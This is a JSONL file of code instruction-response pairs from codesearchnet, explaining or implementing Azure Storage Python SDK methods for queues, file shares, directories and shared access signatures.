{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _list_queues(self, prefix=None, marker=None, max_results=None,\n                     include=None, timeout=None, _context=None):\n        '''\n        Returns a list of queues under the specified account. Makes a single list \n        request to the service. Used internally by the list_queues method.\n\n        :param str prefix:\n            Filters the results to return only queues with names that begin\n            with the specified prefix.\n        :param str marker:\n            A token which identifies the portion of the query to be\n            returned with the next query operation. The operation returns a\n            next_marker element within the response body if the list returned\n            was not complete. This value may then be used as a query parameter\n            in a subsequent call to request the next portion of the list of\n            queues. The marker value is opaque to the client.\n        :param int max_results:\n            The maximum number of queues to return. A single list request may \n            return up to 1000 queues and potentially a continuation token which \n            should be followed to get additional resutls.\n        :param str include:\n            Include this parameter to specify that the container's\n            metadata be returned as part of the response body.\n        :param int timeout:\n            The server timeout, expressed in seconds.\n        '''\n        request = HTTPRequest()\n        request.method = 'GET'\n        request.host_locations = self._get_host_locations(secondary=True)\n        request.path = _get_path()\n        request.query = {\n            'comp': 'list',\n            'prefix': _to_str(prefix),\n            'marker': _to_str(marker),\n            'maxresults': _int_to_str(max_results),\n            'include': _to_str(include),\n            'timeout': _int_to_str(timeout)\n        }\n\n        return self._perform_request(request, _convert_xml_to_queues, operation_context=_context)", "response": "Returns a list of queues under the specified account."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating a queue under the given account.", "response": "def create_queue(self, queue_name, metadata=None, fail_on_exist=False, timeout=None):\n        '''\n        Creates a queue under the given account.\n\n        :param str queue_name:\n            The name of the queue to create. A queue name must be from 3 through \n            63 characters long and may only contain lowercase letters, numbers, \n            and the dash (-) character. The first and last letters in the queue \n            must be alphanumeric. The dash (-) character cannot be the first or \n            last character. Consecutive dash characters are not permitted in the \n            queue name.\n        :param metadata:\n            A dict containing name-value pairs to associate with the queue as \n            metadata. Note that metadata names preserve the case with which they \n            were created, but are case-insensitive when set or read. \n        :type metadata: dict(str, str)\n        :param bool fail_on_exist:\n            Specifies whether to throw an exception if the queue already exists.\n        :param int timeout:\n            The server timeout, expressed in seconds.\n        :return:\n            A boolean indicating whether the queue was created. If fail_on_exist \n            was set to True, this will throw instead of returning false.\n        :rtype: bool\n        '''\n        _validate_not_none('queue_name', queue_name)\n        request = HTTPRequest()\n        request.method = 'PUT'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(queue_name)\n        request.query = {'timeout': _int_to_str(timeout)}\n        _add_metadata_headers(metadata, request)\n\n        def _return_request(request):\n            return request\n\n        if not fail_on_exist:\n            try:\n                response = self._perform_request(request, parser=_return_request,\n                                                 expected_errors=[_QUEUE_ALREADY_EXISTS_ERROR_CODE])\n                if response.status == _HTTP_RESPONSE_NO_CONTENT:\n                    return False\n                return True\n            except AzureHttpError as ex:\n                _dont_fail_on_exist(ex)\n                return False\n        else:\n            response = self._perform_request(request, parser=_return_request)\n            if response.status == _HTTP_RESPONSE_NO_CONTENT:\n                raise AzureConflictHttpError(\n                    _ERROR_CONFLICT.format(response.message), response.status)\n            return True"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nretrieving user - defined metadata and queue properties on the specified queue.", "response": "def get_queue_metadata(self, queue_name, timeout=None):\n        '''\n        Retrieves user-defined metadata and queue properties on the specified\n        queue. Metadata is associated with the queue as name-value pairs.\n\n        :param str queue_name:\n            The name of an existing queue.\n        :param int timeout:\n            The server timeout, expressed in seconds.\n        :return:\n            A dictionary representing the queue metadata with an \n            approximate_message_count int property on the dict estimating the \n            number of messages in the queue.\n        :rtype: dict(str, str)\n        '''\n        _validate_not_none('queue_name', queue_name)\n        request = HTTPRequest()\n        request.method = 'GET'\n        request.host_locations = self._get_host_locations(secondary=True)\n        request.path = _get_path(queue_name)\n        request.query = {\n            'comp': 'metadata',\n            'timeout': _int_to_str(timeout),\n        }\n\n        return self._perform_request(request, _parse_metadata_and_message_count)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsetting user - defined metadata on the specified queue.", "response": "def set_queue_metadata(self, queue_name, metadata=None, timeout=None):\n        '''\n        Sets user-defined metadata on the specified queue. Metadata is\n        associated with the queue as name-value pairs.\n\n        :param str queue_name:\n            The name of an existing queue.\n        :param dict metadata:\n            A dict containing name-value pairs to associate with the\n            queue as metadata.\n        :param int timeout:\n            The server timeout, expressed in seconds.\n        '''\n        _validate_not_none('queue_name', queue_name)\n        request = HTTPRequest()\n        request.method = 'PUT'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(queue_name)\n        request.query = {\n            'comp': 'metadata',\n            'timeout': _int_to_str(timeout),\n        }\n        _add_metadata_headers(metadata, request)\n\n        self._perform_request(request)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef set_queue_acl(self, queue_name, signed_identifiers=None, timeout=None):\n        '''\n        Sets stored access policies for the queue that may be used with Shared \n        Access Signatures. \n        \n        When you set permissions for a queue, the existing permissions are replaced. \n        To update the queue's permissions, call :func:`~get_queue_acl` to fetch \n        all access policies associated with the queue, modify the access policy \n        that you wish to change, and then call this function with the complete \n        set of data to perform the update.\n\n        When you establish a stored access policy on a queue, it may take up to \n        30 seconds to take effect. During this interval, a shared access signature \n        that is associated with the stored access policy will throw an \n        :class:`AzureHttpError` until the access policy becomes active.\n\n        :param str queue_name:\n            The name of an existing queue.\n        :param signed_identifiers:\n            A dictionary of access policies to associate with the queue. The \n            dictionary may contain up to 5 elements. An empty dictionary \n            will clear the access policies set on the service. \n        :type signed_identifiers: dict(str, :class:`~azure.storage.common.models.AccessPolicy`)\n        :param int timeout:\n            The server timeout, expressed in seconds.\n        '''\n        _validate_not_none('queue_name', queue_name)\n        _validate_access_policies(signed_identifiers)\n        request = HTTPRequest()\n        request.method = 'PUT'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(queue_name)\n        request.query = {\n            'comp': 'acl',\n            'timeout': _int_to_str(timeout),\n        }\n        request.body = _get_request_body(\n            _convert_signed_identifiers_to_xml(signed_identifiers))\n        self._perform_request(request)", "response": "Sets the permissions for a queue."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nadds a new message to the back of the message queue.", "response": "def put_message(self, queue_name, content, visibility_timeout=None,\n                    time_to_live=None, timeout=None):\n        '''\n        Adds a new message to the back of the message queue. \n\n        The visibility timeout specifies the time that the message will be \n        invisible. After the timeout expires, the message will become visible. \n        If a visibility timeout is not specified, the default value of 0 is used.\n\n        The message time-to-live specifies how long a message will remain in the \n        queue. The message will be deleted from the queue when the time-to-live \n        period expires.\n\n        If the key-encryption-key field is set on the local service object, this method will\n        encrypt the content before uploading.\n\n        :param str queue_name:\n            The name of the queue to put the message into.\n        :param obj content:\n            Message content. Allowed type is determined by the encode_function \n            set on the service. Default is str. The encoded message can be up to \n            64KB in size.\n        :param int visibility_timeout:\n            If not specified, the default value is 0. Specifies the\n            new visibility timeout value, in seconds, relative to server time.\n            The value must be larger than or equal to 0, and cannot be\n            larger than 7 days. The visibility timeout of a message cannot be\n            set to a value later than the expiry time. visibility_timeout\n            should be set to a value smaller than the time-to-live value.\n        :param int time_to_live:\n            Specifies the time-to-live interval for the message, in\n            seconds. The time-to-live may be any positive number or -1 for infinity. If this\n            parameter is omitted, the default time-to-live is 7 days.\n        :param int timeout:\n            The server timeout, expressed in seconds.\n        :return:\n            A :class:`~azure.storage.queue.models.QueueMessage` object.\n            This object is also populated with the content although it is not\n            returned from the service.\n        :rtype: :class:`~azure.storage.queue.models.QueueMessage`\n        '''\n\n        _validate_encryption_required(self.require_encryption, self.key_encryption_key)\n\n        _validate_not_none('queue_name', queue_name)\n        _validate_not_none('content', content)\n        request = HTTPRequest()\n        request.method = 'POST'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(queue_name, True)\n        request.query = {\n            'visibilitytimeout': _to_str(visibility_timeout),\n            'messagettl': _to_str(time_to_live),\n            'timeout': _int_to_str(timeout)\n        }\n\n        request.body = _get_request_body(_convert_queue_message_xml(content, self.encode_function,\n                                                                    self.key_encryption_key))\n\n        message_list = self._perform_request(request, _convert_xml_to_queue_messages,\n                                             [self.decode_function, False,\n                                              None, None, content])\n        return message_list[0]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_messages(self, queue_name, num_messages=None,\n                     visibility_timeout=None, timeout=None):\n        '''\n        Retrieves one or more messages from the front of the queue.\n\n        When a message is retrieved from the queue, the response includes the message \n        content and a pop_receipt value, which is required to delete the message. \n        The message is not automatically deleted from the queue, but after it has \n        been retrieved, it is not visible to other clients for the time interval \n        specified by the visibility_timeout parameter.\n\n        If the key-encryption-key or resolver field is set on the local service object, the messages will be\n        decrypted before being returned.\n\n        :param str queue_name:\n            The name of the queue to get messages from.\n        :param int num_messages:\n            A nonzero integer value that specifies the number of\n            messages to retrieve from the queue, up to a maximum of 32. If\n            fewer are visible, the visible messages are returned. By default,\n            a single message is retrieved from the queue with this operation.\n        :param int visibility_timeout:\n            Specifies the new visibility timeout value, in seconds, relative\n            to server time. The new value must be larger than or equal to 1\n            second, and cannot be larger than 7 days. The visibility timeout of \n            a message can be set to a value later than the expiry time.\n        :param int timeout:\n            The server timeout, expressed in seconds.\n        :return: A :class:`~azure.storage.queue.models.QueueMessage` object representing the information passed.\n        :rtype: list(:class:`~azure.storage.queue.models.QueueMessage`)\n        '''\n        _validate_decryption_required(self.require_encryption, self.key_encryption_key,\n                                      self.key_resolver_function)\n\n        _validate_not_none('queue_name', queue_name)\n        request = HTTPRequest()\n        request.method = 'GET'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(queue_name, True)\n        request.query = {\n            'numofmessages': _to_str(num_messages),\n            'visibilitytimeout': _to_str(visibility_timeout),\n            'timeout': _int_to_str(timeout)\n        }\n\n        return self._perform_request(request, _convert_xml_to_queue_messages,\n                                     [self.decode_function, self.require_encryption,\n                                      self.key_encryption_key, self.key_resolver_function])", "response": "Retrieves one or more messages from the front of a queue."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef delete_message(self, queue_name, message_id, pop_receipt, timeout=None):\n        '''\n        Deletes the specified message.\n\n        Normally after a client retrieves a message with the get_messages operation, \n        the client is expected to process and delete the message. To delete the \n        message, you must have two items of data: id and pop_receipt. The \n        id is returned from the previous get_messages operation. The \n        pop_receipt is returned from the most recent :func:`~get_messages` or \n        :func:`~update_message` operation. In order for the delete_message operation \n        to succeed, the pop_receipt specified on the request must match the \n        pop_receipt returned from the :func:`~get_messages` or :func:`~update_message` \n        operation. \n\n        :param str queue_name:\n            The name of the queue from which to delete the message.\n        :param str message_id:\n            The message id identifying the message to delete.\n        :param str pop_receipt:\n            A valid pop receipt value returned from an earlier call\n            to the :func:`~get_messages` or :func:`~update_message`.\n        :param int timeout:\n            The server timeout, expressed in seconds.\n        '''\n        _validate_not_none('queue_name', queue_name)\n        _validate_not_none('message_id', message_id)\n        _validate_not_none('pop_receipt', pop_receipt)\n        request = HTTPRequest()\n        request.method = 'DELETE'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(queue_name, True, message_id)\n        request.query = {\n            'popreceipt': _to_str(pop_receipt),\n            'timeout': _int_to_str(timeout)\n        }\n        self._perform_request(request)", "response": "Deletes the specified message from the specified queue."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ndelete all messages from the specified queue.", "response": "def clear_messages(self, queue_name, timeout=None):\n        '''\n        Deletes all messages from the specified queue.\n\n        :param str queue_name:\n            The name of the queue whose messages to clear.\n        :param int timeout:\n            The server timeout, expressed in seconds.\n        '''\n        _validate_not_none('queue_name', queue_name)\n        request = HTTPRequest()\n        request.method = 'DELETE'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(queue_name, True)\n        request.query = {'timeout': _int_to_str(timeout)}\n        self._perform_request(request)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef update_message(self, queue_name, message_id, pop_receipt, visibility_timeout,\n                       content=None, timeout=None):\n        '''\n        Updates the visibility timeout of a message. You can also use this\n        operation to update the contents of a message.\n\n        This operation can be used to continually extend the invisibility of a \n        queue message. This functionality can be useful if you want a worker role \n        to \"lease\" a queue message. For example, if a worker role calls get_messages \n        and recognizes that it needs more time to process a message, it can \n        continually extend the message's invisibility until it is processed. If \n        the worker role were to fail during processing, eventually the message \n        would become visible again and another worker role could process it.\n\n        If the key-encryption-key field is set on the local service object, this method will\n        encrypt the content before uploading.\n\n        :param str queue_name:\n            The name of the queue containing the message to update.\n        :param str message_id:\n            The message id identifying the message to update.\n        :param str pop_receipt:\n            A valid pop receipt value returned from an earlier call\n            to the :func:`~get_messages` or :func:`~update_message` operation.\n        :param int visibility_timeout:\n            Specifies the new visibility timeout value, in seconds,\n            relative to server time. The new value must be larger than or equal\n            to 0, and cannot be larger than 7 days. The visibility timeout of a\n            message cannot be set to a value later than the expiry time. A\n            message can be updated until it has been deleted or has expired.\n        :param obj content:\n            Message content. Allowed type is determined by the encode_function \n            set on the service. Default is str.\n        :param int timeout:\n            The server timeout, expressed in seconds.\n        :return: \n            A list of :class:`~azure.storage.queue.models.QueueMessage` objects. For convenience,\n            this object is also populated with the content, although it is not returned by the service.\n        :rtype: list(:class:`~azure.storage.queue.models.QueueMessage`)\n        '''\n\n        _validate_encryption_required(self.require_encryption, self.key_encryption_key)\n\n        _validate_not_none('queue_name', queue_name)\n        _validate_not_none('message_id', message_id)\n        _validate_not_none('pop_receipt', pop_receipt)\n        _validate_not_none('visibility_timeout', visibility_timeout)\n        request = HTTPRequest()\n        request.method = 'PUT'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(queue_name, True, message_id)\n        request.query = {\n            'popreceipt': _to_str(pop_receipt),\n            'visibilitytimeout': _int_to_str(visibility_timeout),\n            'timeout': _int_to_str(timeout)\n        }\n\n        if content is not None:\n            request.body = _get_request_body(_convert_queue_message_xml(content, self.encode_function,\n                                                                        self.key_encryption_key))\n\n        return self._perform_request(request, _parse_queue_message_from_headers)", "response": "Updates the visibility timeout of a message."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef make_file_url(self, share_name, directory_name, file_name,\n                      protocol=None, sas_token=None):\n        '''\n        Creates the url to access a file.\n\n        :param str share_name:\n            Name of share.\n        :param str directory_name:\n            The path to the directory.\n        :param str file_name:\n            Name of file.\n        :param str protocol:\n            Protocol to use: 'http' or 'https'. If not specified, uses the\n            protocol specified when FileService was initialized.\n        :param str sas_token:\n            Shared access signature token created with\n            generate_shared_access_signature.\n        :return: file access URL.\n        :rtype: str\n        '''\n\n        if directory_name is None:\n            url = '{}://{}/{}/{}'.format(\n                protocol or self.protocol,\n                self.primary_endpoint,\n                share_name,\n                file_name,\n            )\n        else:\n            url = '{}://{}/{}/{}/{}'.format(\n                protocol or self.protocol,\n                self.primary_endpoint,\n                share_name,\n                directory_name,\n                file_name,\n            )\n\n        if sas_token:\n            url += '?' + sas_token\n\n        return url", "response": "Creates the url to access a file."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngenerates a shared access signature for the given share.", "response": "def generate_share_shared_access_signature(self, share_name,\n                                               permission=None,\n                                               expiry=None,\n                                               start=None,\n                                               id=None,\n                                               ip=None,\n                                               protocol=None,\n                                               cache_control=None,\n                                               content_disposition=None,\n                                               content_encoding=None,\n                                               content_language=None,\n                                               content_type=None):\n        '''\n        Generates a shared access signature for the share.\n        Use the returned signature with the sas_token parameter of FileService.\n\n        :param str share_name:\n            Name of share.\n        :param SharePermissions permission:\n            The permissions associated with the shared access signature. The\n            user is restricted to operations allowed by the permissions.\n            Permissions must be ordered read, create, write, delete, list.\n            Required unless an id is given referencing a stored access policy\n            which contains this field. This field must be omitted if it has been\n            specified in an associated stored access policy.\n        :param expiry:\n            The time at which the shared access signature becomes invalid.\n            Required unless an id is given referencing a stored access policy\n            which contains this field. This field must be omitted if it has\n            been specified in an associated stored access policy. Azure will always\n            convert values to UTC. If a date is passed in without timezone info, it\n            is assumed to be UTC.\n        :type expiry: datetime or str\n        :param start:\n            The time at which the shared access signature becomes valid. If\n            omitted, start time for this call is assumed to be the time when the\n            storage service receives the request. Azure will always convert values\n            to UTC. If a date is passed in without timezone info, it is assumed to\n            be UTC.\n        :type start: datetime or str\n        :param str id:\n            A unique value up to 64 characters in length that correlates to a\n            stored access policy. To create a stored access policy, use :func:`~set_share_acl`.\n        :param str ip:\n            Specifies an IP address or a range of IP addresses from which to accept requests.\n            If the IP address from which the request originates does not match the IP address\n            or address range specified on the SAS token, the request is not authenticated.\n            For example, specifying sip=168.1.5.65 or sip=168.1.5.60-168.1.5.70 on the SAS\n            restricts the request to those IP addresses.\n        :param str protocol:\n            Specifies the protocol permitted for a request made. Possible values are\n            both HTTPS and HTTP (https,http) or HTTPS only (https). The default value\n            is https,http. Note that HTTP only is not a permitted value.\n        :param str cache_control:\n            Response header value for Cache-Control when resource is accessed\n            using this shared access signature.\n        :param str content_disposition:\n            Response header value for Content-Disposition when resource is accessed\n            using this shared access signature.\n        :param str content_encoding:\n            Response header value for Content-Encoding when resource is accessed\n            using this shared access signature.\n        :param str content_language:\n            Response header value for Content-Language when resource is accessed\n            using this shared access signature.\n        :param str content_type:\n            Response header value for Content-Type when resource is accessed\n            using this shared access signature.\n        :return: A Shared Access Signature (sas) token.\n        :rtype: str\n        '''\n        _validate_not_none('share_name', share_name)\n        _validate_not_none('self.account_name', self.account_name)\n        _validate_not_none('self.account_key', self.account_key)\n\n        sas = FileSharedAccessSignature(self.account_name, self.account_key)\n        return sas.generate_share(\n            share_name,\n            permission,\n            expiry,\n            start=start,\n            id=id,\n            ip=ip,\n            protocol=protocol,\n            cache_control=cache_control,\n            content_disposition=content_disposition,\n            content_encoding=content_encoding,\n            content_language=content_language,\n            content_type=content_type,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_file_service_properties(self, timeout=None):\n        '''\n        Gets the properties of a storage account's File service, including\n        Azure Storage Analytics.\n\n        :param int timeout:\n            The timeout parameter is expressed in seconds.\n        :return: The file service properties.\n        :rtype:\n            :class:`~azure.storage.common.models.ServiceProperties`\n        '''\n        request = HTTPRequest()\n        request.method = 'GET'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path()\n        request.query = {\n            'restype': 'service',\n            'comp': 'properties',\n            'timeout': _int_to_str(timeout),\n        }\n\n        return self._perform_request(request, _convert_xml_to_service_properties)", "response": "Retrieves the properties of a storage account s File service including Azure Storage Analytics."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _list_shares(self, prefix=None, marker=None, max_results=None,\n                     include=None, timeout=None, _context=None):\n        '''\n        Returns a list of the shares under the specified account.\n\n        :param str prefix:\n            Filters the results to return only shares whose names\n            begin with the specified prefix.\n        :param str marker:\n            A string value that identifies the portion of the list\n            to be returned with the next list operation. The operation returns\n            a next_marker value within the response body if the list returned was\n            not complete. The marker value may then be used in a subsequent\n            call to request the next set of list items. The marker value is\n            opaque to the client.\n        :param int max_results:\n            Specifies the maximum number of shares to return. A single list\n            request may return up to 1000 shares and potentially a continuation\n            token which should be followed to get additional resutls.\n        :param string include:\n            Include this parameter to specify that either the share's\n            metadata, snapshots or both be returned as part of the response body. set this\n            parameter to string 'metadata' to get share's metadata. set this parameter to 'snapshots'\n            to get all the share snapshots. for both use 'snapshots,metadata'.\n        :param int timeout:\n            The timeout parameter is expressed in seconds.\n        '''\n        request = HTTPRequest()\n        request.method = 'GET'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path()\n        request.query = {\n            'comp': 'list',\n            'prefix': _to_str(prefix),\n            'marker': _to_str(marker),\n            'maxresults': _int_to_str(max_results),\n            'include': _to_str(include),\n            'timeout': _int_to_str(timeout),\n        }\n\n        return self._perform_request(request, _convert_xml_to_shares, operation_context=_context)", "response": "Returns a list of the shares under the specified account."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef snapshot_share(self, share_name, metadata=None, quota=None, timeout=None):\n        '''\n        Creates a snapshot of an existing share under the specified account.\n\n        :param str share_name:\n            The name of the share to create a snapshot of.\n        :param metadata:\n            A dict with name_value pairs to associate with the\n            share as metadata. Example:{'Category':'test'}\n        :type metadata: a dict of str to str:\n        :param int quota:\n            Specifies the maximum size of the share, in gigabytes. Must be\n            greater than 0, and less than or equal to 5TB (5120).\n        :param int timeout:\n            The timeout parameter is expressed in seconds.\n        :return: snapshot properties\n        :rtype: azure.storage.file.models.Share\n        '''\n        _validate_not_none('share_name', share_name)\n        request = HTTPRequest()\n        request.method = 'PUT'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(share_name)\n        request.query = {\n            'restype': 'share',\n            'comp': 'snapshot',\n            'timeout': _int_to_str(timeout),\n        }\n        request.headers = {\n            'x-ms-share-quota': _int_to_str(quota)\n        }\n        _add_metadata_headers(metadata, request)\n\n        return self._perform_request(request, _parse_snapshot_share, [share_name])", "response": "Creates a snapshot of an existing share."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef set_share_properties(self, share_name, quota, timeout=None):\n        '''\n        Sets service-defined properties for the specified share.\n\n        :param str share_name:\n            Name of existing share.\n        :param int quota:\n            Specifies the maximum size of the share, in gigabytes. Must be \n            greater than 0, and less than or equal to 5 TB (5120 GB).\n        :param int timeout:\n            The timeout parameter is expressed in seconds.\n        '''\n        _validate_not_none('share_name', share_name)\n        _validate_not_none('quota', quota)\n        request = HTTPRequest()\n        request.method = 'PUT'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(share_name)\n        request.query = {\n            'restype': 'share',\n            'comp': 'properties',\n            'timeout': _int_to_str(timeout),\n        }\n        request.headers = {\n            'x-ms-share-quota': _int_to_str(quota)\n        }\n\n        self._perform_request(request)", "response": "Sets the properties of the specified share."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting the permissions for the specified share.", "response": "def get_share_acl(self, share_name, timeout=None):\n        '''\n        Gets the permissions for the specified share.\n\n        :param str share_name:\n            Name of existing share.\n        :param int timeout:\n            The timeout parameter is expressed in seconds.\n        :return: A dictionary of access policies associated with the share.\n        :rtype: dict(str, :class:`~azure.storage.common.models.AccessPolicy`)\n        '''\n        _validate_not_none('share_name', share_name)\n        request = HTTPRequest()\n        request.method = 'GET'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(share_name)\n        request.query = {\n            'restype': 'share',\n            'comp': 'acl',\n            'timeout': _int_to_str(timeout),\n        }\n\n        return self._perform_request(request, _convert_xml_to_signed_identifiers)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_share_stats(self, share_name, timeout=None):\n        '''\n        Gets the approximate size of the data stored on the share,\n        rounded up to the nearest gigabyte.\n        \n        Note that this value may not include all recently created\n        or recently resized files.\n\n        :param str share_name:\n            Name of existing share.\n        :param int timeout:\n            The timeout parameter is expressed in seconds.\n        :return: the approximate size of the data stored on the share.\n        :rtype: int\n        '''\n        _validate_not_none('share_name', share_name)\n        request = HTTPRequest()\n        request.method = 'GET'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(share_name)\n        request.query = {\n            'restype': 'share',\n            'comp': 'stats',\n            'timeout': _int_to_str(timeout),\n        }\n\n        return self._perform_request(request, _convert_xml_to_share_stats)", "response": "Retrieves the approximate size of the data stored on the given share."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndelete the specified share.", "response": "def delete_share(self, share_name, fail_not_exist=False, timeout=None, snapshot=None, delete_snapshots=None):\n        '''\n        Marks the specified share for deletion. If the share\n        does not exist, the operation fails on the service. By \n        default, the exception is swallowed by the client.\n        To expose the exception, specify True for fail_not_exist.\n\n        :param str share_name:\n            Name of share to delete.\n        :param bool fail_not_exist:\n            Specify whether to throw an exception when the share doesn't\n            exist. False by default.\n        :param int timeout:\n            The timeout parameter is expressed in seconds.\n        :param str snapshot:\n            A string that represents the snapshot version, if applicable.\n            Specify this argument to delete a specific snapshot only.\n            delete_snapshots must be None if this is specified.\n        :param ~azure.storage.file.models.DeleteSnapshot delete_snapshots:\n            To delete a share that has snapshots, this must be specified as DeleteSnapshot.Include.\n        :return: True if share is deleted, False share doesn't exist.\n        :rtype: bool\n        '''\n        _validate_not_none('share_name', share_name)\n        request = HTTPRequest()\n        request.method = 'DELETE'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(share_name)\n        request.headers = {\n            'x-ms-delete-snapshots': _to_str(delete_snapshots)\n        }\n        request.query = {\n            'restype': 'share',\n            'timeout': _int_to_str(timeout),\n            'sharesnapshot': _to_str(snapshot),\n        }\n\n        if not fail_not_exist:\n            try:\n                self._perform_request(request, expected_errors=[_SHARE_NOT_FOUND_ERROR_CODE])\n                return True\n            except AzureHttpError as ex:\n                _dont_fail_not_exist(ex)\n                return False\n        else:\n            self._perform_request(request)\n            return True"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create_directory(self, share_name, directory_name, metadata=None,\n                         fail_on_exist=False, timeout=None):\n        '''\n        Creates a new directory under the specified share or parent directory. \n        If the directory with the same name already exists, the operation fails\n        on the service. By default, the exception is swallowed by the client.\n        To expose the exception, specify True for fail_on_exists.\n\n        :param str share_name:\n            Name of existing share.\n        :param str directory_name:\n            Name of directory to create, including the path to the parent \n            directory.\n        :param metadata:\n            A dict with name_value pairs to associate with the\n            share as metadata. Example:{'Category':'test'}\n        :type metadata: dict(str, str):\n        :param bool fail_on_exist:\n            specify whether to throw an exception when the directory exists.\n            False by default.\n        :param int timeout:\n            The timeout parameter is expressed in seconds.\n        :return: True if directory is created, False if directory already exists.\n        :rtype: bool\n        '''\n        _validate_not_none('share_name', share_name)\n        _validate_not_none('directory_name', directory_name)\n        request = HTTPRequest()\n        request.method = 'PUT'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(share_name, directory_name)\n        request.query = {\n            'restype': 'directory',\n            'timeout': _int_to_str(timeout),\n        }\n        _add_metadata_headers(metadata, request)\n\n        if not fail_on_exist:\n            try:\n                self._perform_request(request, expected_errors=_RESOURCE_ALREADY_EXISTS_ERROR_CODE)\n                return True\n            except AzureHttpError as ex:\n                _dont_fail_on_exist(ex)\n                return False\n        else:\n            self._perform_request(request)\n            return True", "response": "Creates a new directory under the specified share or parent directory."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_directory_properties(self, share_name, directory_name, timeout=None, snapshot=None):\n        '''\n        Returns all user-defined metadata and system properties for the\n        specified directory. The data returned does not include the directory's\n        list of files.\n\n        :param str share_name:\n            Name of existing share.\n        :param str directory_name:\n           The path to an existing directory.\n        :param int timeout:\n            The timeout parameter is expressed in seconds.\n        :return: properties for the specified directory within a directory object.\n        :param str snapshot:\n            A string that represents the snapshot version, if applicable.\n        :rtype: :class:`~azure.storage.file.models.Directory`\n        '''\n        _validate_not_none('share_name', share_name)\n        _validate_not_none('directory_name', directory_name)\n        request = HTTPRequest()\n        request.method = 'GET'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(share_name, directory_name)\n        request.query = {\n            'restype': 'directory',\n            'timeout': _int_to_str(timeout),\n            'sharesnapshot': _to_str(snapshot)\n        }\n\n        return self._perform_request(request, _parse_directory, [directory_name])", "response": "Returns all user - defined metadata and system properties for the specified directory within a given share."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a list of the directories and files under the specified share.", "response": "def _list_directories_and_files(self, share_name, directory_name=None,\n                                    marker=None, max_results=None, timeout=None,\n                                    prefix=None, _context=None, snapshot=None):\n        '''\n        Returns a list of the directories and files under the specified share.\n\n        :param str share_name:\n            Name of existing share.\n        :param str directory_name:\n            The path to the directory.\n        :param str marker:\n            A string value that identifies the portion of the list\n            to be returned with the next list operation. The operation returns\n            a next_marker value within the response body if the list returned was\n            not complete. The marker value may then be used in a subsequent\n            call to request the next set of list items. The marker value is\n            opaque to the client.\n        :param int max_results:\n            Specifies the maximum number of files to return,\n            including all directory elements. If the request does not specify\n            max_results or specifies a value greater than 5,000, the server will\n            return up to 5,000 items. Setting max_results to a value less than\n            or equal to zero results in error response code 400 (Bad Request).\n        :param int timeout:\n            The timeout parameter is expressed in seconds.\n        :param str prefix:\n            List only the files and/or directories with the given prefix.\n        :param str snapshot:\n            A string that represents the snapshot version, if applicable.\n        '''\n        _validate_not_none('share_name', share_name)\n        request = HTTPRequest()\n        request.method = 'GET'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(share_name, directory_name)\n        request.query = {\n            'restype': 'directory',\n            'comp': 'list',\n            'prefix': _to_str(prefix),\n            'marker': _to_str(marker),\n            'maxresults': _int_to_str(max_results),\n            'timeout': _int_to_str(timeout),\n            'sharesnapshot': _to_str(snapshot)\n        }\n\n        return self._perform_request(request, _convert_xml_to_directories_and_files,\n                                     operation_context=_context)"}
